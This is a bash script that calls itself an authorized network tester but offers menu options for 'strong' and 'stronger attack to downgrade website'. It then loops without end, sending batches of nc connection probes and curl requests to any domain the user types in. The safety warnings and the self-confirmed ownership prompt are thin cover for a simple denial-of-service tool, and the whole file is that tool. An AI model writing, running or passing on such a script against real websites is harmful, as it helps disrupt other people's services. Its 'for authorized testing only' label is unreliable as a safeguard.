#!/bin/bash

# Network connection tester - FOR AUTHORIZED TESTING ONLY
# This script sends controlled traffic to YOUR OWN infrastructure

echo "WARNING: This script is for authorized testing only. Use only on systems you own or have explicit permission to test."

# Select attack type
echo "Select attack type:"
echo "1: Strong attack"
echo "2: Weak attack"
echo "3: Stronger attack to downgrade website"
read -p "Enter choice (1-3): " attack_choice

# Set parameters based on attack type
case $attack_choice in
  1)
    MAX_CONNECTIONS=10
    DELAY_BETWEEN_REQUESTS=1
    ;;
  2)
    MAX_CONNECTIONS=5
    DELAY_BETWEEN_REQUESTS=2
    ;;
  3)
    MAX_CONNECTIONS=20
    DELAY_BETWEEN_REQUESTS=0.5
    ;;
  *)
    echo "Invalid choice"
    exit 1
    ;;
esac

# Select protocol
echo "Select attack protocol:"
echo "1: HTTP"
echo "2: HTTPS"
read -p "Enter choice (1-2): " protocol_choice

case $protocol_choice in
  1)
    SCHEME="http"
    TARGET_PORT=80
    ;;
  2)
    SCHEME="https"
    TARGET_PORT=443
    ;;
  *)
    echo "Invalid choice"
    exit 1
    ;;
esac

# Enter website domain
read -p "Enter website domain: " TARGET_HOST

# Verify ownership
verify_ownership() {
  echo "IMPORTANT: Confirming target: $TARGET_HOST:$TARGET_PORT"
  read -p "Do you confirm you own or have explicit permission to test this target? (yes/no): " CONFIRM
  if [[ "$CONFIRM" != "yes" ]]; then
    echo "Verification failed. Exiting."
    exit 1
  fi
}
verify_ownership

# Set URL
URL="${SCHEME}://${TARGET_HOST}"

echo "Starting network test with the following parameters:"
echo "  - Target: $URL"
echo "  - Connections per batch: $MAX_CONNECTIONS"
echo "  - Delay between batches: $DELAY_BETWEEN_REQUESTS seconds"
echo "  - Duration: Continuous until stopped"
echo ""
echo "Press Ctrl+C to stop the attack."

# Initialize counter
request_count=0

# Run the test indefinitely
while true; do
  for ((i=1; i<=$MAX_CONNECTIONS; i++)); do
    # TCP test
    timeout 1 nc -zv $TARGET_HOST $TARGET_PORT &>/dev/null &
    
    # HTTP/HTTPS test
    curl -s -o /dev/null -w "%{http_code}" "$URL" &>/dev/null &
    
    request_count=$((request_count + 1))
  done
  
  # Display progress
  echo -ne "Requests sent: $request_count\r"
  
  sleep $DELAY_BETWEEN_REQUESTS
done
